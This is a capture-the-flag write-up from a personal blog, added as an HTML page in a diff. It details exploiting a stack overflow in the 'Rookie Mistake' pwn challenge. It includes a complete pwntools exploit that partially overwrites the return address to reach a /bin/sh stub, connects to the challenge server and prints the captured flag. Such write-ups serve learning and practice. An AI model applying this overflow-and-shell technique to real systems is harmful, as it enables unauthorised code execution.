@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBoo CTF 2025 | Pwn: Rookie Mistake [easy] - moeve&#39;s blog</title><link rel="icon" type="image/x-icon" href="/favicon2.8f68632c487952c29fd770f908f1910c2adc7ffbb78ffd0c71771bca8c5b71e1.ico" /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Abusing a padding-only overflow to pivot main&#39;s return address onto the hidden win stub and pop a remote shell for the flag." />
+	<meta property="og:image" content=""/>
+	<script>
+	(function () {
+		var storageKey = 'theme';
+		var classList = document.documentElement.classList;
+		var storedTheme = null;
+		try {
+			storedTheme = window.localStorage.getItem(storageKey);
+		} catch (err) {
+			storedTheme = null;
+		}
+		var prefersDark = false;
+		try {
+			prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+		} catch (err) {
+			prefersDark = false;
+		}
+		var theme = (storedTheme === 'dark' || storedTheme === 'light') ? storedTheme : (prefersDark ? 'dark' : 'light');
+		if (theme === 'dark') {
+			classList.add('dark');
+		} else {
+			classList.remove('dark');
+		}
+	})();
+	</script>
+	<script type="module" src="http://localhost:1313/js/theme-toggle.js" defer></script>
+	<meta property="og:url" content="http://localhost:1313/writeups/writeups/hacktheboo-ctf-2025-pwn-rookie-mistake-easy/">
+  <meta property="og:site_name" content="moeve&#39;s blog">
+  <meta property="og:title" content="HackTheBoo CTF 2025 | Pwn: Rookie Mistake [easy]">
+  <meta property="og:description" content="Abusing a padding-only overflow to pivot main&#39;s return address onto the hidden win stub and pop a remote shell for the flag.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-10-27T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-27T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="HackTheBoo 2025">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Ret2win">
+    <meta property="article:tag" content="X86_64">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HackTheBoo CTF 2025 | Pwn: Rookie Mistake [easy]">
+  <meta name="twitter:description" content="Abusing a padding-only overflow to pivot main&#39;s return address onto the hidden win stub and pop a remote shell for the flag.">
+
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7a5c05040394322612a2d98397e9932aa81d9d7acc70199463e79f8180c8e0c0.css" />
+		
+		
+		<link rel="stylesheet" type="text/css" href="http://localhost:1313/css/custom.07f912777db42e88a413bca7f38a722b56303b2914ca91d86ae3341cccc44ed5.css">
+		
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">moeve&#39;s blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/writeups/">Writeups</a>
+		
+		<a href="/tags/">Tags</a>
+		
+		<button id="theme-toggle" class="theme-toggle" type="button" aria-label="Switch to dark mode" aria-pressed="false">
+			<svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+			</svg>
+			<svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+				<circle cx="12" cy="12" r="5"></circle>
+				<line x1="12" y1="1" x2="12" y2="3"></line>
+				<line x1="12" y1="21" x2="12" y2="23"></line>
+				<line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+				<line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+				<line x1="1" y1="12" x2="3" y2="12"></line>
+				<line x1="21" y1="12" x2="23" y2="12"></line>
+				<line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+				<line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+			</svg>
+		</button>
+	</nav>
+</header>
+
+<main>
+  <article>
+    <div class="post-container">
+      
+      <div class="post-content">
+        <div class="title">
+          <h1 class="title">HackTheBoo CTF 2025 | Pwn: Rookie Mistake [easy]</h1>
+          <div class="meta">Posted on Oct 27, 2025</div>
+        </div>
+        
+        <section class="body">
+          <p>Rook — the fearless, reckless hunter — has become trapped within the binary during his attempt to erase NEMEGHAST. To set him free, you must align the cores and unlock his path back to the light. Failing that… find another way. Bypass the mechanism. Break the cycle. objective: Ret2win but not in a function, but a certain address.</p>
+<h2 id="step-1-explore-the-challenge-files">Step 1: Explore the Challenge Files</h2>
+<p>Identify the provided artifacts and the binary format.</p>
+<pre tabindex="0"><code>ls
+file rookie_mistake
+cat README.txt
+</code></pre><p>Findings:</p>
+<ul>
+<li>Single ELF named <code>rookie_mistake</code>, plus a themed README.</li>
+<li>64-bit dynamically linked binary, <strong>no PIE</strong>, <strong>NX enabled</strong>, <strong>stack canary disabled</strong>, CET (IBT/SHSTK) on.</li>
+</ul>
+<h2 id="step-2-baseline-runtime-behavior">Step 2: Baseline Runtime Behavior</h2>
+<p>Observe how the binary interacts with stdin/stdout.</p>
+<pre tabindex="0"><code>./rookie_mistake
+</code></pre><p>Output snippet:</p>
+<pre tabindex="0"><code>【Gℓιт¢н Vσι¢є】Яοοқ... Μу ɓєℓονєɗ нυηтєя.. Aℓιgη тнє ¢οяєѕ.. Eѕ¢αρє!
+rook@ie:~$ 【Gℓιт¢н Vσι¢є】Шɨʟʟ ʏѳʋ ʍąŋąɠɛ ȶѳ ƈąʟʟ ȶнɛ ƈѳяɛ ąŋɗ ɛʂƈąքɛ?!
+</code></pre><p>Program reads from stdin once; any crash exits back to shell. No evidence of menuing or length checks—likely a single overflow.</p>
+<h2 id="step-3-static-recon">Step 3: Static Recon</h2>
+<p>Use pwntools/objdump to enumerate symbols and key functions.</p>
+<pre tabindex="0"><code>from pwn import *
+elf = ELF(&#39;rookie_mistake&#39;)
+print(&#39;main&#39;, hex(elf.symbols[&#39;main&#39;]))
+for name in (&#39;banner&#39;,&#39;check_core&#39;,&#39;overflow_core&#39;,&#39;fail&#39;,&#39;setup&#39;):
+    func = elf.functions[name]
+    print(f&#34;{name}@{hex(func.address)} size {func.size}&#34;)
+</code></pre><p>Highlights:</p>
+<ul>
+<li><code>main</code> zeroes a 32-byte local buffer, prints ASCII art, then calls <code>read(0, buf, 0x2e)</code>.</li>
+<li><code>check_core</code>/<code>overflow_core</code> compare six global “core” slots against user input; failing invokes <code>fail</code> (prints scolding text).</li>
+<li><code>0x401758</code> is a short stub that loads the string <code>/bin/sh</code> from <code>.rodata</code> and jumps to <code>system@plt</code>—classic <code>win</code> gadget.</li>
+</ul>
+<p><code>strings</code> confirms <code>/bin/sh</code> at <code>0x4030a7</code>.</p>
+<h2 id="step-4-measure-the-overflow">Step 4: Measure the Overflow</h2>
+<p>Inspect <code>main</code>’s prologue to confirm stack layout.</p>
+<pre tabindex="0"><code>objdump -d rookie_mistake --start-address=0x40176b --stop-address=0x4017d6
+</code></pre><p>Key instructions:</p>
+<ul>
+<li><code>sub rsp, 0x20</code> → local buffer is 0x20 bytes.</li>
+<li>After the <code>read</code> call there is no stack canary; returning uses the saved <code>rbp</code>/<code>rip</code> at offsets <code>+0x20</code> and <code>+0x28</code>.</li>
+</ul>
+<p>Therefore payload structure: <code>[32 bytes padding][overwrite saved RBP][new RIP]</code>.</p>
+<h2 id="step-5-local-proof-of-concept">Step 5: Local Proof of Concept</h2>
+<p>Craft payload and run locally to ensure the jump hits <code>system</code>.</p>
+<pre tabindex="0"><code>from pwn import *
+payload = b&#39;A&#39;*0x20 + b&#39;B&#39;*8 + p64(0x401758)[:6]
+proc = process(&#39;./rookie_mistake&#39;)
+proc.send(payload + b&#39;id\n&#39;)
+print(proc.recvline())
+</code></pre><p>Notes:</p>
+<ul>
+<li>CET rejects 8-byte gadgets lacking ENDBR64, so partial overwrite (<code>[:6]</code>) keeps high bytes intact and lands exactly on <code>0x401758</code> which begins with ENDBR.</li>
+<li>After ret, banner still prints due to buffered output; patience is required.</li>
+</ul>
+<h2 id="step-6-the-exploit">Step 6: The Exploit</h2>
+<pre tabindex="0"><code>from pwn import *
+import time
+
+context.binary = ELF(&#39;./rookie_mistake&#39;)
+context.log_level = &#39;info&#39;
+
+HOST = &#39;164.92.240.36&#39;
+PORT = 30498
+WIN_ADDR = 0x401758
+OFFSET = 0x20
+
+payload = b&#39;A&#39; * OFFSET
+payload += b&#39;B&#39; * 8
+payload += p64(WIN_ADDR)[:6]
+
+CMD = b&#39;cat flag.txt || cat /flag&#39;
+
+
+def main():
+    io = remote(HOST, PORT)
+    io.sendline(payload)
+    io.sendline(CMD)
+
+    data = b&#39;&#39;
+    deadline = time.time() + 120
+    while time.time() &lt; deadline:
+        chunk = io.recv(timeout=5)
+        if not chunk:
+            continue
+        data += chunk
+        if b&#39;HTB{&#39; in data:
+            break
+
+    start = data.index(b&#39;HTB{&#39;)
+    end = data.index(b&#39;}&#39;, start)
+    flag = data[start:end+1]
+    log.success(flag.decode())
+    with open(&#39;flag.txt&#39;, &#39;wb&#39;) as f:
+        f.write(flag + b&#34;\n&#34;)
+    io.close()
+
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre><ul>
+<li>CET’s SHSTK/IBT do not hinder us because the entire thing is legitimate compiled code.</li>
+<li>The slow, sleep-laden <code>printstr</code> routine means <code>recvrepeat</code>/timeouts must be generous.</li>
+</ul>
+<p>Run the exploit</p>
+<pre tabindex="0"><code>python3 exploit.py
+</code></pre><pre tabindex="0"><code>[*] Opening connection to 164.92.240.36 on port 30498: Done
+[*] Received 4146 bytes
+[+] HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7}
+</code></pre><h2 id="takeaways">Takeaways</h2>
+<ul>
+<li>Non-PIE binary + absent canary reduces exploit to straightforward ret2win despite CET being enabled.</li>
+<li>Partial-pointer overwrites remain handy for CET-hardened binaries where high bytes must remain canonical.</li>
+</ul>
+
+        </section>
+        <div class="post-tags">
+          
+          
+          <nav class="nav tags">
+            <ul class="tags">
+              
+              <li><a href="/tags/hackthebox">HackTheBox</a></li>
+              
+              <li><a href="/tags/hacktheboo-2025">HackTheBoo 2025</a></li>
+              
+              <li><a href="/tags/pwn">Pwn</a></li>
+              
+              <li><a href="/tags/ret2win">ret2win</a></li>
+              
+              <li><a href="/tags/x86_64">x86_64</a></li>
+              
+            </ul>
+          </nav>
+          
+          
+        </div>
+      </div>
+
+      
+      
+    </div>
+
+    </article>
+</main>
+<footer>
+  <div style="display:flex"></div>
+  <div class="footer-info">
+    © 2025 moeve · Theme based on <a href="https://github.com/athul/archie">Archie</a> (MIT)
+  </div>
+</footer>
+
+</div>
+    </body>
+</html>
